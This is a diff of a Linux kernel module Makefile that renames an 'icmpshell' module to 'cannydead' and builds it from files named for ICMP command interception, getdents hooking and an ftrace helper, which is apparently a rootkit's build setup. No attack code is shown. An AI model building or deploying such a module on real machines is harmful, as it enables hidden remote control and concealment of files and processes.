@@ -1,11 +1,11 @@
-KERNELDIR:=/lib/modules/$(shell uname -r)/build
+KERNELDIR := /lib/modules/$(shell uname -r)/build
 
-obj-m = icmpshell.o
-icmpshell-objs = main.o
+obj-m := cannydead.o
+cannydead-objs := cannydead_main.o cannydead_icmp_command_interceptor.o cannydead_getdents_hook.o cannydead_ftrace_helper.o
 
-all: icmpshell.ko
+all: cannydead.ko
 
-icmpshell.ko: main.c
+cannydead.ko: cannydead_main.c cannydead_icmp_command_interceptor.c cannydead_getdents_hook.c
 	make -C $(KERNELDIR) M=$(PWD) modules
 
 clean:
